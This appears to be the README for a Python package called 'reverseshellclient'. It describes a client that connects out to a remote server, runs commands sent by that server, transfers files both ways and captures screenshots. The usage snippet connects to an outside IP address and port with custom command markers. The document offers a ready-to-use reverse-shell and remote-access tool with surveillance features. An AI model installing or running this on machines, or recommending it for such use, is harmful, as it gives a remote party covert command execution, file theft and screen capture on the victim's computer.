# Reverse shell client for unbureaucratic server/client connections with file transfer / screenshots 

## pip install reverseshellclient 

#### Tested against Windows 10 / Python 3.10 / Anaconda 


Connect to the server at the specified IP address and port, and perform a reverse shell client-server communication.
To install the server: https://pypi.org/project/reverseshellserver/

Parameters:
	ipaddress (str): The IP address of the server to connect to.
	port (int): The port number of the server to connect to.
	byte_len (int, optional): The maximum size of each data chunk (in bytes) used for communication with the server.
	command_putfile (str, optional): The command prefix used to indicate a request from the server to send a file to the client.
	command_getfile (str, optional): The command prefix used to indicate a request from the server to receive a file from the client.
	command_screenshot (str, optional): The command that, when sent by the server, requests the client to take a screenshot and send it back as an image file.
	command_getcwd (str, optional): The command that, when sent by the server, requests the client to send the current working directory path.
	command_putfile_sep (bytes, optional): The separator used to split the 'putfile' command and the filename along with the file content.
	command_start (bytes, optional): The marker used to indicate the start of a command transmission.
	command_end (bytes, optional): The marker used to indicate the end of a command transmission.
	before_stdout (bytes, optional): Bytes to prepend before the standard output of the executed command in the response to the server.
	before_stderr (bytes, optional): Bytes to prepend before the standard error of the executed command in the response to the server.

Note:
	- This function connects to the server specified by 'ipaddress' and 'port'.
	- It performs a continuous loop of client-server communication until interrupted.
	- The 'before_stdout' and 'before_stderr' parameters are used to format the response to the server when executing shell commands.
	- The 'command_putfile', 'command_getfile', 'command_screenshot', and 'command_getcwd' prefixes are used to indicate specific actions from the server.
	- The 'command_putfile_sep' is used to split the 'putfile' command and the filename along with the file content.
	- 'command_start' and 'command_end' are used to wrap the encoded command for large data transmissions.
	
```python
    r"""
from reverseshellclient import connect_to_server
connect_to_server(
	ipaddress="171.181.217.19",
	port=12345,
	byte_len=32768,
	command_putfile="putfile",
	command_getfile="getfile",
	command_screenshot="screenshot",
	command_getcwd="getcwd",
	command_putfile_sep=b"FILESEP",
	command_start=b"START_START_START",
	command_end=b"END_END_END",
	before_stdout=b"stdout:\nxxxxxxxxxxxxxxxxxx\n",
	before_stderr=b"\nxxxxxxxxxxxxxxxxxx\nstderr:\n",
)

		
```